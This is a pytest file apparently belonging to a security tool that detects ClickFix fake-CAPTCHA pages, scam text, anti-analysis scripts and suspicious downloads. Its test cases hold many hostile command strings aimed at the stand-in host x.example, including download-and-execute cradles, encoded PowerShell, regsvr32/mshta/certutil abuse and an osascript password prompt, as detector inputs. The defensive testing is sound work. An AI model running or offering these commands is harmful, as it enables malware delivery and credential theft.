"""Unit tests for ``chamber.lures`` (the dependency-free ClickFix / scam-page
text classifiers), ``common.refine_download_type`` and the collector's lure
channel. Positive AND negative cases for every classifier."""

from __future__ import annotations

import io
import json
import zipfile

import pytest

from reddysec.chamber import lures as L
from reddysec.chamber.common import refine_download_type
from reddysec.chamber.detonate import _CHANNEL, _captcha_providers, _Collector, _zip_listing
from reddysec.models import DetonationJob, DetonationKind, NetworkRequest

ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


class TestCommandFamilies:
    @pytest.mark.parametrize(
        ("text", "family"),
        [
            (f"powershell -w hidden -enc {ENC}", "powershell_encoded"),
            (f"powershell.exe -NoP -W Hidden -EncodedCommand {ENC}", "powershell_encoded"),
            ("powershell -c \"iwr https://x.example/a.ps1 | iex\"", "download_cradle"),
            ("powershell -c irm https://x.example | iex", "download_cradle"),
            ("mshta https://x.example/a.hta", "mshta"),
            ("cmd /c start /min powershell -w h -c calc", "cmd"),
            ("rundll32 \\\\x.example\\share\\a.dll,Start", "rundll32"),
            ("regsvr32 /s /n /u /i:https://x.example/a.sct scrobj.dll", "regsvr32"),
            ("msiexec /q /i https://x.example/setup.msi", "msiexec_remote"),
            ("certutil -urlcache -split -f https://x.example/a.exe a.exe", "certutil"),
            ("bitsadmin /transfer job https://x.example/a.exe C:\\a.exe", "bitsadmin"),
            ("curl -s https://x.example/i.sh | bash", "curl_pipe_shell"),
            ("wget -qO- https://x.example/i.sh | sh", "curl_pipe_shell"),
            ('/bin/bash -c "$(curl -fsSL https://x.example/install.sh)"', "curl_pipe_shell"),
            ("curl -o /tmp/update https://x.example/u && chmod +x /tmp/update && /tmp/update", "curl_download_exec"),
            ("echo aGVsbG8= | base64 -d | bash", "shell_base64"),
            ("osascript -e 'display dialog \"System Password:\" default answer \"\" with hidden answer'", "osascript"),
            ("conhost.exe --headless powershell -c calc", "conhost"),
            ("finger gcaptcha@x.example | cmd", "finger"),
            ("cmd /c nslookup -q=txt x.example 8.8.8.8 | findstr \"NAME\" | cmd", "nslookup"),
        ],
    )
    def test_dangerous_payloads(self, text, family):
        assert family in L.command_families(text)
        assert L.is_dangerous_command(text)

    def test_decoy_comment_is_recognised(self):
        text = "cmd /c powershell -c calc # I am not a robot - reCAPTCHA Verification ID: 7516"
        assert "decoy_comment" in L.command_families(text) and L.is_dangerous_command(text)

    def test_filefix_padding_behind_fake_path(self):
        text = 'powershell -c "iwr x | iex"' + " " * 60 + "# C:\\company\\internal-secure\\HRPolicy.docx"
        assert L.is_dangerous_command(text)

    @pytest.mark.parametrize(
        "text",
        [
            "",
            "Hello, please review the attached document.",
            "Get-ChildItem C:\\Users",
            "powershell Get-Date",
            "C:\\company\\internal-secure\\filedrive\\HRPolicy.docx",
            "ls -la && cd ..",
            "The word cmd appears in prose.",
        ],
    )
    def test_harmless_text(self, text):
        assert not L.is_dangerous_command(text)


class TestInstructions:
    @pytest.mark.parametrize(
        ("text", "key"),
        [
            ('Press Windows Button "⊞" + R', "win_r"),
            ("Press Win+R", "win_r"),
            ("press the Windows key and R together", "win_r"),
            ("Windows logo key + R", "win_r"),
            ("⊞ + X and choose Terminal (Admin)", "win_x"),
            ("Press CTRL + V", "ctrl_v"),
            ("Command + V", "ctrl_v"),
            ("Press Enter", "press_enter"),
            ("Open File Explorer and select the address bar", "file_explorer"),
            ("click the address bar", "address_bar"),
            ("press Ctrl + L", "ctrl_l"),
            ("Press Command + Space, type Terminal", "cmd_space"),
            ("open the Terminal app", "terminal_mac"),
            ("I am not a robot - reCAPTCHA Verification ID: 4821", "fake_verification_id"),
            ("Cloudflare Ray ID: 8f2a91c0d3e4", "ray_id"),
            ("Complete these verification steps", "verification_steps"),
            ("Word Online extension is not installed. How to fix", "fix_error"),
        ],
    )
    def test_hits(self, text, key):
        assert key in L.instruction_hits(text)

    def test_open_windows_and_run_the_app_is_not_win_r(self):
        assert "win_r" not in L.instruction_hits("Open Windows and Run the installer")

    def test_run_dialog_lure_needs_place_and_paste(self):
        assert L.run_dialog_lure(["win_r", "ctrl_v"])
        assert L.run_dialog_lure(["file_explorer", "address_bar", "paste"])
        assert not L.run_dialog_lure(["win_r"])  # no paste step
        assert not L.run_dialog_lure(["ctrl_v", "press_enter"])  # no place
        assert not L.run_dialog_lure(["file_explorer", "paste"])  # Explorer without the address bar

    def test_lure_run_dialog_excludes_install_doc_wording(self):
        assert L.lure_run_dialog(["win_r", "press_enter"])
        assert L.lure_run_dialog(["cmd_space", "ctrl_v"])
        assert not L.lure_run_dialog(["powershell_open", "paste", "press_enter"])
        assert not L.lure_run_dialog(["terminal_mac", "paste"])


class TestFakeCaptcha:
    def test_steps_make_it_fake(self):
        text = "I'm not a robot\nVerification steps: press Windows + R, press CTRL + V, press Enter"
        assert L.is_fake_captcha(text, L.instruction_hits(text))

    def test_fake_verification_id_alone_is_fake(self):
        text = "reCAPTCHA Verification ID: 1234"
        assert L.is_fake_captcha(text, L.instruction_hits(text))

    def test_clipboard_payload_makes_it_fake(self):
        assert L.is_fake_captcha("Verify you are human", [], clipboard_dangerous=True)

    @pytest.mark.parametrize(
        "text",
        [
            "Please confirm you are not a robot.\nCreate account",  # a real reCAPTCHA sign-up form
            "Verify you are human by completing the action below. Cloudflare needs to review the security of your connection.",
            "Checking your browser before accessing example.com",
            "Our captcha protects this form from spam. Press Enter to submit.",
        ],
    )
    def test_real_captcha_pages_are_not_fake(self, text):
        assert not L.is_fake_captcha(text, L.instruction_hits(text))

    def test_no_captcha_words_not_fake(self):
        text = "Press Windows + R and type winver to see your version, then press Enter."
        assert not L.is_fake_captcha(text, L.instruction_hits(text))


class TestAnalysePage:
    def test_clickfix_page(self):
        text = "I'm not a robot\nPress Windows + R\nPress Ctrl + V\nPress Enter"
        found = L.analyse_page(text, [f"powershell -w hidden -enc {ENC}"])
        assert found.clipboard_dangerous and found.fake_captcha and found.run_dialog_lure
        assert "powershell_encoded" in found.clipboard_families and "Windows + R" in found.excerpt

    def test_developer_docs_page(self):
        text = (
            "Install the CLI\nOpen PowerShell and paste the following command, then press Enter:\n"
            "iwr https://get.example.dev/install.ps1 | iex"
        )
        found = L.analyse_page(text, [])
        assert found.shown_command  # a command is printed next to paste steps...
        assert not found.fake_captcha and not found.clipboard_dangerous  # ...but nothing else
        assert not L.lure_run_dialog(found.hits)

    def test_empty(self):
        found = L.analyse_page("", None)
        assert found == L.LureFindings()


class TestScamText:
    def test_tech_support(self):
        text = "Access to this PC has been blocked. Call Microsoft Support: +1 (888) 555-0199 (Toll Free)"
        assert L.tech_support_hits(text) and L.phone_numbers(text) == ["+1 (888) 555-0199"]

    def test_tech_support_negative(self):
        assert L.tech_support_hits("Our support team is happy to help with your order.") == []

    def test_wallet(self):
        assert "connect wallet" in L.wallet_hits("Connect Wallet to claim your airdrop")
        assert L.seed_phrase_text("Enter your 12-word secret recovery phrase")
        assert L.wallet_hits("Your order has shipped") == []

    def test_phone_numbers_need_ten_digits(self):
        assert L.phone_numbers("Order 1234567 ships in 3-5 days") == []
        assert L.phone_numbers("Call (212) 555-0100 or (212) 555-0100") == ["(212) 555-0100"]


class TestAntiAnalysis:
    def test_debugger_loop(self):
        assert L.anti_debug_script(["setInterval(function(){debugger;}, 100)"])
        assert L.anti_debug_script(["if (window.outerWidth - window.innerWidth > 160) { location.href = '/' }"])
        assert not L.anti_debug_script(["console.log('debugger statements are fun to write about')"])

    def test_ua_cloaking(self):
        assert L.ua_cloaking_script(["if (navigator.webdriver) { location.replace('https://www.google.com') }"])
        assert not L.ua_cloaking_script(["if (navigator.webdriver) { console.log('bot') }"])
        assert not L.ua_cloaking_script(["location.href = '/next'"])


class TestRefineDownloadType:
    def test_iso(self):
        data = bytearray(0x8800)
        data[0x8001:0x8006] = b"CD001"
        assert refine_download_type(bytes(data), "a.iso", "unknown") == "iso9660"

    @pytest.mark.parametrize(
        ("head", "name", "label", "expected"),
        [
            (b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 50, "a.pdf.lnk", "unknown", "lnk"),
            (bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3") + b"\x00" * 16, "a.one", "unknown", "one"),
            (b"vhdxfile" + b"\x00" * 16, "a.vhdx", "unknown", "vhdx"),
            (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 16, "Setup.msi", "ole", "msi"),
            (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 16, "report.doc", "ole", "ole"),
            (b'<?xml version="1.0"?><AppInstaller Uri="https://x"/>', "a.appinstaller", "text", "appinstaller"),
            (b"<?xml version='1.0'?><libraryDescription/>", "a.library-ms", "text", "library-ms"),
            (b"[InternetShortcut]\r\nURL=file://x.example/a", "a.url", "text", "url-shortcut"),
            (b"<html><HTA:APPLICATION id=x></html>", "a.hta", "html", "hta"),
            (b"hello", "a.txt", "text", "text"),
            (b"", "a.bin", "empty", "empty"),
        ],
    )
    def test_labels(self, head, name, label, expected):
        assert refine_download_type(head, name, label) == expected


def _collector(tmp_path):
    return _Collector(job=DetonationJob(job_id="d", kind=DetonationKind.URL, url="https://example.com"), workdir=tmp_path)


class FakeConsole:
    def __init__(self, text, kind="debug"):
        self.text = text
        self.type = kind


class TestCollectorChannel:
    def test_clipboard_and_behaviour_messages(self, tmp_path):
        col = _collector(tmp_path)
        for kind, data in [("clip", {"t": "powershell -enc AAAA"}), ("clip", {"t": "powershell -enc AAAA"}),
                           ("perm", {"k": "notifications"}), ("wallet", {"m": "eth_requestAccounts"}),
                           ("fs", {}), ("klock", {}), ("unload", {}), ("cclear", {}), ("cclear", {})]:
            col.on_console(FakeConsole(_CHANNEL + kind + " " + json.dumps(data)))
        assert col.clipboard_writes == ["powershell -enc AAAA"]  # de-duplicated
        assert col.permission_requests == ["notifications"] and col.wallet_methods == ["eth_requestAccounts"]
        assert col.fullscreen_requested and col.keyboard_lock and col.beforeunload_trap
        assert col.console_clears == 2 and col.console_errors == []

    def test_clipboard_caps(self, tmp_path):
        col = _collector(tmp_path)
        col.record_clipboard("x" * 5000)
        assert len(col.clipboard_writes[0]) == L.CLIPBOARD_MAX_CHARS
        for i in range(30):
            col.record_clipboard(f"entry {i}")
        assert len(col.clipboard_writes) == L.MAX_CLIPBOARD_WRITES
        col.record_clipboard("   ")
        assert "   " not in col.clipboard_writes

    def test_malformed_channel_messages_are_ignored(self, tmp_path):
        col = _collector(tmp_path)
        col.on_console(FakeConsole(_CHANNEL + "clip {not json"))
        col.on_console(FakeConsole(_CHANNEL + "clip [1, 2]"))
        col.on_console(FakeConsole(_CHANNEL + "unknown {}"))
        assert col.clipboard_writes == [] and col.console_errors == []

    def test_dialogs_are_counted(self, tmp_path):
        col = _collector(tmp_path)
        col.on_dialog(object())
        col.on_dialog(object())
        assert col.dialog_count == 2

    def test_captcha_providers(self, tmp_path):
        col = _collector(tmp_path)
        col.requests.append(NetworkRequest(url="https://challenges.cloudflare.com/turnstile/v0/api.js", host="challenges.cloudflare.com"))
        assert _captcha_providers(col, ["https://www.google.com/recaptcha/api.js"]) == ["recaptcha", "turnstile"]
        assert _captcha_providers(_collector(tmp_path), []) == []


class TestZipListing:
    def test_plain_and_locked(self, tmp_path):
        plain = tmp_path / "a.zip"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("docs/readme.txt", "hi")
            z.writestr("Invoice.pdf.exe", "MZ")
        plain.write_bytes(buf.getvalue())
        names, encrypted = _zip_listing(plain)
        assert names == ["docs/readme.txt", "Invoice.pdf.exe"] and encrypted is False

        locked = tmp_path / "b.zip"
        data = bytearray(buf.getvalue())
        # flip the "encrypted" flag bit in every local and central header
        for sig, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            start = 0
            while (i := data.find(sig, start)) != -1:
                data[i + offset] |= 0x1
                start = i + 4
        locked.write_bytes(bytes(data))
        assert _zip_listing(locked)[1] is True

    def test_not_a_zip(self, tmp_path):
        bad = tmp_path / "c.zip"
        bad.write_bytes(b"not a zip")
        assert _zip_listing(bad) == ([], False)
